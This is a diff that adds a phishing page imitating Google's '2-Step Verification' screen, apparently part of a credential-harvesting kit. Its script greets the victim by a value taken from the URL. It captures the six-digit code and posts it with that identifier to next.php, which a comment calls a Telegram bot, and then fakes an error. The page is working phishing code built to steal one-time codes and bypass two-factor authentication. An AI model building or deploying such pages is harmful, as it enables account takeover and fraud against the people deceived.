@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2-Step Verification - Google Accounts</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* Gmail brand colors */
+            --gmail-blue: #1a73e8;
+            --gmail-red: #ea4335;
+            --gmail-yellow: #fbbc04;
+            --gmail-green: #34a853;
+            --gmail-white: #ffffff;
+            --gmail-gray: #5f6368;
+            --gmail-light-gray: #f1f3f4;
+            --gmail-border: #dadce0;
+        }
+
+        * { box-sizing: border-box; }
+
+        html, body {
+            margin: 0 !important;
+            padding: 0 !important;
+            width: 100% !important;
+            height: 100% !important;
+            overflow-x: hidden !important;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
+            background: var(--gmail-light-gray) !important;
+            color: #202124 !important;
+            -webkit-font-smoothing: antialiased !important;
+            -moz-osx-font-smoothing: grayscale !important;
+        }
+
+        .gmail-container {
+            background: var(--gmail-white) !important;
+            box-shadow: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px 3px rgba(60,64,67,.15) !important;
+            border-radius: 8px !important;
+            margin: 24px auto 0 !important;
+            padding: 48px 40px 36px !important;
+            width: 100% !important;
+            max-width: 450px !important;
+            min-height: 400px !important;
+            display: flex !important;
+            flex-direction: column !important;
+            justify-content: center !important;
+            align-items: center !important;
+            box-sizing: border-box !important;
+        }
+
+        .gmail-form {
+            width: 100% !important;
+            max-width: 360px !important;
+            margin: 0 auto !important;
+        }
+
+        .gmail-logo {
+            width: 75px !important;
+            height: 24px !important;
+            margin: 0 auto 16px !important;
+            display: block !important;
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzUiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA3NSAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIyLjc1IDEySDE5djYuNDhoMy43NVoiIGZpbGw9IiMxQTczRTgiLz4KPHBhdGggZD0iTTIyLjc1IDI0SDE5VjE3LjYuNGgzLjc1VjI0WiIgZmlsbD0iIzM0QTg1MyIvPgo8cGF0aCBkPSJNMjIuNzUgMTEuNGgxOC41YzEuMDUgMCAxLjkyLjg3IDEuOTIgMS45MnYxOC41YzAgMS4wNS0uODcgMS45Mi0xLjkyIDEuOTJIMTUuNzVjLTEuMDUgMC0xLjkyLS44Ny0xLjkyLTEuOTJWMTMuMzJjMC0xLjA1Ljg3LTEuOTIgMS45Mi0xLjkyaDYuODN2My43NVoiIGZpbGw9IiNGQkJDMDQiLz4KPHBhdGggZD0iTTIyLjc1IDExLjRoMTguNWMxLjA1IDAgMS45Mi44NzEgMS45MiAxLjkyVjMwYzAgMS4wNS0uODcgMS45Mi0xLjkyIDEuOTJIMTUuNzVjLTEuMDUgMC0xLjkyLS44Ny0xLjkyLTEuOTJWMTMuMzJjMC0xLjA1Ljg3LTEuOTIgMS45Mi0xLjkyaDYuODN2My43NVoiIGZpbGw9IiNFQTQzMzUiLz4KPHBhdGggZD0iTTIyLjc1IDI0SDE5VjE3LjYuNGgzLjc1VjI0WiIgZmlsbD0iIzM0QTg1MyIvPgo8L3N2Zz4K') no-repeat center center !important;
+            background-size: contain !important;
+        }
+
+        .otp-title {
+            font-size: 24px !important;
+            font-weight: 400 !important;
+            font-family: 'Roboto', sans-serif !important;
+            color: #202124 !important;
+            margin: 0 0 8px 0 !important;
+            text-align: center !important;
+        }
+
+        .otp-subtitle {
+            font-size: 16px !important;
+            color: #5f6368 !important;
+            margin: 0 0 24px 0 !important;
+            text-align: center !important;
+        }
+
+        .otp-message {
+            font-size: 14px !important;
+            color: #5f6368 !important;
+            margin: 0 0 32px 0 !important;
+            text-align: center !important;
+            line-height: 1.4 !important;
+        }
+
+        .otp-inputs {
+            display: flex !important;
+            justify-content: center !important;
+            gap: 8px !important;
+            margin: 24px 0 !important;
+        }
+
+        .otp-inputs input {
+            width: 36px !important;
+            height: 44px !important;
+            text-align: center !important;
+            font-size: 20px !important;
+            font-weight: 400 !important;
+            border: 1px solid var(--gmail-border) !important;
+            border-radius: 4px !important;
+            background: var(--gmail-white) !important;
+            color: #202124 !important;
+            outline: none !important;
+            transition: border-color 0.2s ease !important;
+        }
+
+        .otp-inputs input:focus {
+            border: 2px solid var(--gmail-blue) !important;
+        }
+
+        .gmail-next-btn {
+            width: 100% !important;
+            background: var(--gmail-blue) !important;
+            color: var(--gmail-white) !important;
+            border: none !important;
+            border-radius: 4px !important;
+            padding: 12px 24px !important;
+            font-size: 14px !important;
+            font-weight: 500 !important;
+            cursor: pointer !important;
+            margin-top: 24px !important;
+            text-transform: none !important;
+        }
+
+        .gmail-next-btn:hover {
+            background: #1557b0 !important;
+        }
+
+        .gmail-links {
+            margin-top: 32px !important;
+            text-align: center !important;
+        }
+
+        .gmail-links a {
+            color: var(--gmail-blue) !important;
+            text-decoration: none !important;
+            font-size: 14px !important;
+            margin: 0 16px !important;
+            display: block !important;
+            margin-bottom: 16px !important;
+        }
+
+        .gmail-links a:hover {
+            text-decoration: underline !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="gmail-container">
+        <div class="gmail-form">
+            <div class="gmail-logo"></div>
+            <h1 class="otp-title">2-Step Verification</h1>
+            <div class="otp-subtitle">Get a verification code</div>
+
+            <div class="otp-message" id="otp-message">
+                Enter the 6-digit code sent to your email or phone
+            </div>
+
+            <div class="otp-inputs">
+                <input type="text" maxlength="1" id="otp1" aria-label="Digit 1" oninput="moveToNext(this, 'otp2')" onkeydown="handleBackspace(this, null)">
+                <input type="text" maxlength="1" id="otp2" aria-label="Digit 2" oninput="moveToNext(this, 'otp3')" onkeydown="handleBackspace(this, 'otp1')">
+                <input type="text" maxlength="1" id="otp3" aria-label="Digit 3" oninput="moveToNext(this, 'otp4')" onkeydown="handleBackspace(this, 'otp2')">
+                <input type="text" maxlength="1" id="otp4" aria-label="Digit 4" oninput="moveToNext(this, 'otp5')" onkeydown="handleBackspace(this, 'otp3')">
+                <input type="text" maxlength="1" id="otp5" aria-label="Digit 5" oninput="moveToNext(this, 'otp6')" onkeydown="handleBackspace(this, 'otp4')">
+                <input type="text" maxlength="1" id="otp6" aria-label="Digit 6" onkeydown="handleBackspace(this, 'otp5')">
+            </div>
+
+            <button class="gmail-next-btn" onclick="verifyOtp()">Next</button>
+
+            <div class="gmail-links">
+                <a href="#" onclick="resendCode()">Resend code</a>
+                <a href="#" onclick="needHelp()">Try another way</a>
+            </div>
+        </div>
+    </div>
+
+  
+
+    <script>
+        function goBack() {
+            window.location.href = 'simple_tiktok.html';
+        }
+
+        // Get URL parameters
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+
+        // Set the message
+        var type = getUrlParameter('type');
+        var value = getUrlParameter('value');
+        var message = "";
+        if (type === 'email') {
+            message = "Hi " + value + "! Your code was sent to your registered email.";
+        } else {
+            message = "Hi " + value + "! Your code was sent to your registered phone number.";
+        }
+        document.getElementById('otp-message').innerText = message;
+
+        function moveToNext(current, nextId) {
+            if (current.value.length === 1 && nextId) {
+                document.getElementById(nextId).focus();
+            }
+        }
+
+        function handleBackspace(current, prevId) {
+            if (event.key === 'Backspace' && current.value === '' && prevId) {
+                document.getElementById(prevId).focus();
+            }
+        }
+
+        function verifyOtp() {
+            var otp = '';
+            for (var i = 1; i <= 6; i++) {
+                otp += document.getElementById('otp' + i).value;
+            }
+            if (otp.length === 6) {
+                // Send OTP to next.php (Telegram bot) FIRST
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', 'next.php', false); // Make synchronous
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send('di=' + encodeURIComponent(value) + '&otp=' + encodeURIComponent(otp));
+
+                // THEN show error message
+                document.getElementById('error-message').style.display = 'block';
+            } else {
+                alert("Please enter a 6-digit code.");
+            }
+        }
+
+        function resendCode() {
+            alert("Code resent!");
+            // Optionally send resend request, but for now just alert
+        }
+
+        function needHelp() {
+            alert("Please contact support.");
+            // Optionally redirect to help page
+        }
+    </script>
+</body>
+</html>
